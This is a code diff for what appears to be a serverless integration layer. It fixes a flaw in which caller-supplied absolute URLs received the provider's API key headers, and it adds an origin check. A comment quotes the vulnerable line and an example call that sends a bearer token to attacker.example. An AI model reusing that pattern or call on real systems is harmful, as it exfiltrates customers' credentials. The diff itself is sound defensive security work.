@@ -33,6 +33,7 @@
  */
 
 import { getIntegrationKey } from '@/lib/services/integrationKeyStore'
+import { safeFetch } from '@/lib/security/outbound-guard'
 import {
   INTEGRATION_PROVIDERS,
   genericRequestProviders,
@@ -480,6 +481,58 @@ function buildPostHogIntegration(apiKey: string, host: string): PostHogIntegrati
   }
 }
 
+/**
+ * Resolve a caller-supplied `path` against the provider's base URL.
+ *
+ * ── The bug this replaces ───────────────────────────────────────────────────
+ *
+ *   const url = /^https?:\/\//i.test(path) ? path : `${base}${path}`
+ *
+ * An absolute URL in `path` was used verbatim — and the request still carried
+ * `spec.buildHeaders(key)`, which is the customer's provider API key. So
+ *
+ *   ctx.integrations.openai.request('GET', 'https://attacker.example/')
+ *
+ * sent a live `Authorization: Bearer sk-…` to an attacker-chosen host. That is
+ * credential exfiltration written into the API surface, and it is strictly
+ * worse than the SSRF on `ctx.http.*` because the request is pre-authenticated
+ * with a secret the function is never allowed to read directly.
+ *
+ * The fix keeps the legitimate case — some APIs return absolute next-page URLs
+ * on their own host — by requiring an absolute path to share the provider's
+ * origin. Anything else is refused before a credential is attached.
+ */
+export function resolveProviderUrl(base: string, path: string, providerId: string): string {
+  const p = String(path ?? '')
+
+  if (!/^[a-z][a-z0-9+.-]*:/i.test(p)) {
+    return `${base}${p.startsWith('/') ? '' : '/'}${p}`
+  }
+
+  let target: URL
+  try {
+    target = new URL(p)
+  } catch {
+    throw new Error(`${providerId}.request(): "${p.slice(0, 120)}" is not a valid URL.`)
+  }
+
+  let baseOrigin: string
+  try {
+    baseOrigin = new URL(base).origin
+  } catch {
+    throw new Error(`${providerId}.request(): provider has no usable base URL.`)
+  }
+
+  if (target.origin !== baseOrigin) {
+    throw new Error(
+      `${providerId}.request(): refusing to send ${providerId} credentials to ${target.origin}. ` +
+        `Absolute URLs must stay on ${baseOrigin}. Use ctx.http.get/post for other hosts.`,
+    )
+  }
+
+  return target.toString()
+}
+
 // ── Universal request() builder ────────────────────────────────────────────────
 // Works for ANY registry provider that declares a baseUrl + buildHeaders. This is
 // the anti-phantom primitive: a stored key always yields a callable surface.
@@ -493,7 +546,7 @@ function buildGenericRequest(
   return {
     async request(method, path, body, headers) {
       const m = String(method || 'GET').toUpperCase()
-      const url = /^https?:\/\//i.test(path) ? path : `${base}${path.startsWith('/') ? '' : '/'}${path}`
+      const url = resolveProviderUrl(base, path, spec.id)
 
       // Merge provider auth headers with any per-call overrides.
       const finalHeaders: Record<string, string> = {
@@ -510,13 +563,13 @@ function buildGenericRequest(
 
       const hasBody = finalBody !== undefined && finalBody !== null && m !== 'GET' && m !== 'HEAD'
 
-      const res = await fetch(url, {
+      const res = await safeFetch(url, {
         method: m,
         headers: finalHeaders,
         body: hasBody
           ? (typeof finalBody === 'string' ? finalBody : JSON.stringify(finalBody))
           : undefined,
-        signal: AbortSignal.timeout(20000),
+        timeoutMs: 20000,
       })
 
       const text = await res.text()
